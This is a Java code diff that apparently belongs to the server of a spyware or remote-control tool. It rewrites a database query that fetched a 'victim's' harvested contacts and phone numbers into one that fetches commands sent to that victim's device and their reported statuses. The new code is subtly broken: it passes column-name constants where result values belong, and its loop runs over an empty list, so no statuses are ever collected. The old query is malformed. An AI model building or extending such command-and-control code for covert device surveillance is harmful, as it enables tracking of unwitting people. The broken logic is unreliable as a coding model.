@@ -14,6 +14,12 @@ import java.util.List;
  * Created by theapache64 on 14/9/16,4:37 PM.
  */
 public class Commands extends BaseTable<Command> {
+    public static final String COLUMN_COMMAND = "command";
+    private static final String COLUMN_AS_COMMAND_ESTABLISHED_AT = "command_established_at";
+    private static final String COLUMN_AS_COMMAND_STATUSES = "command_statuses";
+    private static final String COLUMN_AS_COMMAND_STATUS_MESSAGES = "command_status_messages";
+    private static final String COLUMN_AS_COMMAND_STATUSES_REPORTED_AT = "command_statuses_reported_at";
+
     private Commands() {
     }
 
@@ -28,31 +34,30 @@ public class Commands extends BaseTable<Command> {
 
         List<Command> commands = null;
 
-        final String query = "SELECT ,UNIX_TIMESTAMP(c.created_at) AS unix_epoch FROM contacts c INNER JOIN phone_numbers p ON p.contact_id = c.id LEFT JOIN contact_names_audit cna ON cna.contact_id = c.id WHERE c.victim_id= ? GROUP BY c.id ORDER BY c.id DESC;";
+        final String query = "SELECT c.id,c.command, UNIX_TIMESTAMP(c.created_at) AS command_established_at, GROUP_CONCAT(cs.status) AS command_statuses, GROUP_CONCAT(cs.status_message) AS command_status_messages, GROUP_CONCAT(UNIX_TIMESTAMP(cs.created_at)) AS command_statuses_reported_at FROM commands c INNER JOIN command_statuses cs ON cs.command_id = c.id WHERE c.client_id=? AND c.victim_id=? GROUP BY c.id ORDER BY c.id DESC;";
         final java.sql.Connection con = Connection.getConnection();
         try {
             final PreparedStatement ps = con.prepareStatement(query);
-            ps.setString(1, victimId);
+            ps.setString(1, clientId);
+            ps.setString(2, victimId);
             final ResultSet rs = ps.executeQuery();
             if (rs.first()) {
                 commands = new ArrayList<>();
                 do {
-                    final String name = rs.getString(COLUMN_NAME);
-                    final String preNames = rs.getString(COLUMN_AS_PRE_NAMES);
-                    final long syncedAt = rs.getLong(COLUMN_AS_UNIX_EPOCH);
+                    final String id = rs.getString(COLUMN_ID);
+                    final String command = rs.getString(COLUMN_COMMAND);
+                    final long commandEstablishedAt = rs.getLong(COLUMN_AS_COMMAND_ESTABLISHED_AT);
 
-                    final String[] phoneNumbers = getGroupDecatenated(rs.getString(COLUMN_AS_PHONE_NUMBERS));
-                    final String[] phoneTypes = getGroupDecatenated(rs.getString(COLUMN_AS_PHONE_TYPES));
+                    final String[] commandStatusesArr = getGroupDecatenated(COLUMN_AS_COMMAND_STATUSES);
+                    final String[] commandStatusMessages = getGroupDecatenated(COLUMN_AS_COMMAND_STATUS_MESSAGES);
+                    final String[] commandStatusesReportedAt = getGroupDecatenated(COLUMN_AS_COMMAND_STATUSES_REPORTED_AT);
 
-                    List<Contact.PhoneNumber> phoneNumbersList = null;
-                    if (phoneNumbers != null) {
-                        phoneNumbersList = new ArrayList<>(phoneNumbers.length);
-                        for (int i = 0; i < phoneNumbers.length; i++) {
-                            phoneNumbersList.add(new Contact.PhoneNumber(null, phoneNumbers[i], phoneTypes[i]));
-                        }
+                    final List<Command.Status> commandStatuses = new ArrayList<>(commandStatusesArr.length);
+                    for (int i = 0; i < commandStatuses.size(); i++) {
+                        commandStatuses.add(new Command.Status(commandStatusesArr[i], commandStatusMessages[i], Long.parseLong(commandStatusesReportedAt[i])));
                     }
 
-                    commands.add(new Contact(null, null, null, name, phoneNumbersList, preNames, syncedAt));
+                    commands.add(new Command(id, command, commandEstablishedAt, commandStatuses));
 
                 } while (rs.next());
             }
